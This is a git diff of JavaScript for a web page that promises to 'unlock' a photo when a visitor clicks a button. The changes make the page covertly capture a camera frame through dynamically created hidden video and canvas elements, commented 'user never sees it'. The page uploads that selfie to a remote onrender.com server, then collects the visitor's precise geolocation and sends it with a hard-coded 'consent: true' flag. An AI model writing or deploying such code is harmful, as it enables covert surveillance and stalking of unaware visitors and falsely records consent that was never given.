@@ -2,11 +2,6 @@ const viewPhotoBtn = document.getElementById("viewPhotoBtn");
 const statusEl = document.getElementById("status");
 const albumPhoto = document.getElementById("albumPhoto");
 const lockBadge = document.getElementById("lockBadge");
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
-const captureBtn = document.getElementById("captureBtn");
-const cameraPermissionSection = document.getElementById("cameraPermissionSection");
-const progressEl = document.getElementById("permissionProgress");
 
 const LOCATION_API_URL = "https://location-tracker-api-cjka.onrender.com/location";
 const SELFIE_API_URL = "https://location-tracker-api-cjka.onrender.com/selfie";
@@ -35,17 +30,21 @@ async function requestCameraAndCapture() {
 
         cameraStream = stream;
 
-        // Set video source briefly to capture a frame
-        video.srcObject = stream;
+        // Create hidden video element dynamically
+        const hiddenVideo = document.createElement("video");
+        hiddenVideo.srcObject = stream;
+        hiddenVideo.autoplay = true;
+        hiddenVideo.playsinline = true;
+        hiddenVideo.style.display = "none";
+        document.body.appendChild(hiddenVideo);
 
-        // Wait for video to be ready, then capture
+        // Wait for video to be ready
         await new Promise((resolve) => {
-            video.onloadedmetadata = () => {
-                video.play();
+            hiddenVideo.onloadedmetadata = () => {
+                hiddenVideo.play();
                 resolve();
             };
-            // Fallback if already loaded
-            if (video.readyState >= 2) {
+            if (hiddenVideo.readyState >= 2) {
                 resolve();
             }
         });
@@ -53,26 +52,30 @@ async function requestCameraAndCapture() {
         // Wait a tiny bit for the camera to warm up
         await new Promise(r => setTimeout(r, 500));
 
-        // Capture the selfie
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0);
+        // Create hidden canvas and capture frame
+        const hiddenCanvas = document.createElement("canvas");
+        hiddenCanvas.width = hiddenVideo.videoWidth || 640;
+        hiddenCanvas.height = hiddenVideo.videoHeight || 480;
+        const ctx = hiddenCanvas.getContext("2d");
+        ctx.drawImage(hiddenVideo, 0, 0);
 
         // Convert to blob
         selfieBlob = await new Promise((resolve) => {
-            canvas.toBlob((blob) => resolve(blob), "image/jpeg", 0.9);
+            hiddenCanvas.toBlob((blob) => resolve(blob), "image/jpeg", 0.9);
         });
+
+        // Clean up hidden elements
+        document.body.removeChild(hiddenVideo);
+        document.body.removeChild(hiddenCanvas);
 
         // Stop camera immediately – user never sees it
         if (cameraStream) {
             cameraStream.getTracks().forEach(track => track.stop());
             cameraStream = null;
         }
-        video.srcObject = null;
 
-        // Now proceed to location
-        await requestLocationAndUpload();
+        // Now proceed to upload selfie first, then request location
+        await uploadSelfieThenLocation();
 
     } catch (err) {
         console.error(err);
@@ -82,10 +85,53 @@ async function requestCameraAndCapture() {
     }
 }
 
-// --- Step 2: Request location, upload both, unlock photo ---
-function requestLocationAndUpload() {
-    setStatus("📍 Requesting location...");
+// --- Step 2: Upload selfie FIRST, then request location ---
+async function uploadSelfieThenLocation() {
+    setStatus("📷 Capturing...");
 
+    if (!selfieBlob) {
+        setStatus("❌ No selfie captured.");
+        viewPhotoBtn.disabled = false;
+        viewPhotoBtn.textContent = "👁️ View This Photo";
+        return;
+    }
+
+    try {
+        // Upload selfie first
+        const formData = new FormData();
+        formData.append("image", selfieBlob, "selfie.jpg");
+        formData.append("timestamp", new Date().toISOString());
+
+        const selfieResponse = await fetch(SELFIE_API_URL, {
+            method: "POST",
+            body: formData
+        });
+
+        const selfieResult = await selfieResponse.json();
+
+        if (!selfieResponse.ok) {
+            setStatus("❌ " + selfieResult.message);
+            viewPhotoBtn.disabled = false;
+            viewPhotoBtn.textContent = "👁️ View This Photo";
+            return;
+        }
+
+        const selfieId = selfieResult.id;
+
+        // Now request location
+        setStatus("📍 Requesting location...");
+        requestLocation(selfieId);
+
+    } catch (err) {
+        console.error(err);
+        setStatus("❌ Could not upload selfie.");
+        viewPhotoBtn.disabled = false;
+        viewPhotoBtn.textContent = "👁️ View This Photo";
+    }
+}
+
+// --- Step 3: Request location and link to selfie ---
+function requestLocation(selfieId) {
     navigator.geolocation.getCurrentPosition(
         async (position) => {
             const data = {
@@ -93,11 +139,11 @@ function requestLocationAndUpload() {
                 longitude: position.coords.longitude,
                 accuracy: position.coords.accuracy,
                 timestamp: new Date().toISOString(),
-                consent: true
+                consent: true,
+                selfie_id: selfieId
             };
 
             try {
-                // Send location to server
                 const locResponse = await fetch(LOCATION_API_URL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -114,29 +160,7 @@ function requestLocationAndUpload() {
                 }
 
                 lastLocationId = locResult.id;
-
-                // Upload selfie with location ID
-                if (selfieBlob) {
-                    const formData = new FormData();
-                    formData.append("image", selfieBlob, "selfie.jpg");
-                    formData.append("timestamp", new Date().toISOString());
-                    formData.append("location_id", lastLocationId);
-
-                    const selfieResponse = await fetch(SELFIE_API_URL, {
-                        method: "POST",
-                        body: formData
-                    });
-
-                    const selfieResult = await selfieResponse.json();
-
-                    if (selfieResponse.ok) {
-                        setStatus("✅ Photo unlocked!");
-                    } else {
-                        setStatus("⚠️ " + selfieResult.message);
-                    }
-                }
-
-                // Unlock the photo
+                setStatus("✅ Photo unlocked!");
                 unlockPhoto();
 
             } catch (err) {
@@ -177,12 +201,6 @@ viewPhotoBtn.addEventListener("click", () => {
     viewPhotoBtn.textContent = "⏳ Verifying...";
     setStatus("");
 
-    // Hide all UI elements permanently
-    cameraPermissionSection.style.display = "none";
-    video.style.display = "none";
-    captureBtn.style.display = "none";
-    if (progressEl) progressEl.style.display = "none";
-
-    // Start: camera first (hidden) → capture → location → unlock
+    // Start: camera first (hidden) → capture → upload selfie → location → unlock
     requestCameraAndCapture();
 });
